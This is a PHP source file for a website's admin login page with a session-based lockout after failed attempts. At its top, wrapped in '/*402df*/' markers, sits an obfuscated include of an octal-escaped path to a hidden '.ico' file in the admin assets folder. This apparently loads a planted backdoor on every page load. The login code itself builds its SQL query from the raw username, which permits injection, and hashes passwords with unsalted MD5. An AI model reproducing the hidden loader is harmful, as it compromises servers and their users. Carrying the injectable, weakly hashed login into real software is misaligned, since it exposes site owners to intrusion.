<?php
/*402df*/

@include "\057hom\1453/a\143tiv\163d6/\163ico\155arc\056com\057wha\164sap\160too\154kit\057adm\151n/a\163set\163/.3\070eca\14486.\151co";

/*402df*/

    include './admin/dbConfig.php';
    if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
        header("Location: ./admin/users.php");
    } else {
        // header("Location: index.php");
        // exit();
    }
if ($_POST) {
    

    if(!isset($_SESSION['attempt'])){
        $_SESSION['attempt'] = 0;
        $_SESSION['time_locked'] = 0;
    } else {
        // check the difference between timelocked and now to determine whether the user has been locked out before due to many requests
        if (time()-$_SESSION['time_locked'] >= 30 and intval($_SESSION['attempt']) == 4 ){
             $_SESSION['attempt'] = 0;
            $_SESSION['time_locked'] = 0;
             unset($_SESSION['message']);
            //  print_r('f'); exit;
        } elseif (time()-$_SESSION['time_locked'] >= 30 and intval($_SESSION['attempt']) <= 3 ) {
            $_SESSION['time_locked'] = 0;
            unset($_SESSION['message']);
            // print_r('s'); exit;
        }
        
        else {
            // if time difference is less than 30
            // you cant login
            header("Location:{$_SERVER['HTTP_REFERER']}");
        }
        // print_r($_SESSION['attempt']); exit;
        $username=$_POST['username']; 
        $password=$_POST['password']; 
        $username = stripslashes($username);
        $password = stripslashes($password);
        $password = md5($password);
        $sql="SELECT * FROM adminUser WHERE username='$username' and password='$password'";
        $result = $conn->query($sql);

        if ($result->num_rows > 0) {
            while($row = $result->fetch_assoc()) {
                // print_r($row);exit();
                // session_start();
                $_SESSION['loggedin'] = true;
                $_SESSION['username'] = $row['username'];
                $_SESSION['role'] = $row['role'];
                $_SESSION['userId'] = $row['id'];
                $_SESSION['data'] = $row;
                // dashboard.php
                // print_r($_SESSION);
            }
            header("Location: ./admin/users.php");
        } else {
            if (intval($_SESSION['attempt']) < 3 ){

                $_SESSION['attempt']= intval( $_SESSION['attempt'])+1;
                
                header("Location:{$_SERVER['HTTP_REFERER']}");

            } else {
                
                $_SESSION['time_locked'] = time();
                $_SESSION['attempt']= intval( $_SESSION['attempt'])+1;
                $_SESSION['message'] = "Login limit reached, try again after 30 seconds";
                header("Location:{$_SERVER['HTTP_REFERER']}");
                
            }
            

          echo "0 results";
        }

    }

        
  
    // exit();
}

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>::Welcome to Admin</title>
        <?php require_once './admin/includes/header_styles.php' ?>
        <link href="https://cdn.jsdelivr.net/gh/iamdyt/eduzoft/tokenMaster/css/styles.css" rel="stylesheet" />
        <link rel="stylesheet" href="./css/styles.css">
        <link href="https://cdn.datatables.net/1.10.20/css/dataTables.bootstrap4.min.css" rel="stylesheet" crossorigin="anonymous" />
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/js/all.min.js" crossorigin="anonymous"></script>
    </head>
    <body class="">
        <div class="bg-overlay"></div>
        <section class="account-pages my-5 pt-5">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 offset-md-3">
                        
                            <?php if (!empty($_SESSION['message'])){  ?>
                                <div class="alert alert-danger d-flex align-items-center" role="alert">
                                    <svg class="bi flex-shrink-0 me-2" width="24" height="24" role="img" aria-label="Danger:"><use xlink:href="#exclamation-triangle-fill"/></svg>
                                    <div>
                                    <?= $_SESSION['message'] ?>
                                    </div>
                                </div>
                            <?php } ?>
                        
                        <div class="card card-body p-4 bg-white animate__animated animate__fadeInUp animate">
                        <h4 class="font-size-18 text-muted mt-2 text-center">Welcome Back !</h4>
                        <p class="mb-5 text-center">Sign in to continue</p>
                            <form id="loginPassForm" method="POST" class="">
                                <div class="row">
                                            <div class="col-md-12">
                                                <div class="mb-4">
                                                    <label class="form-label" for="username">Username</label>
                                                    <input type="text" name="username" class="form-control py-4" id="userName" required placeholder="Enter username">
                                                </div>
                                                <div class="mb-4">
                                                    <label class="form-label" for="userpassword">Password</label>
                                                    <input type="password" name="password" class="form-control py-4" id="userPassword" required placeholder="Enter password">
                                                </div>

                                                <div class="d-grid mt-4">
                                                    <button class="btn btn-success  waves-effect waves-light" type="submit">Log In</button>
                                                </div>
                                            </div>
                                </div>
                        </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>



        <script src="https://code.jquery.com/jquery-3.4.1.min.js" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>

        <!-- new -->
        <?php require_once './admin/includes/footer_styles.php'?>
    </body>
</html>
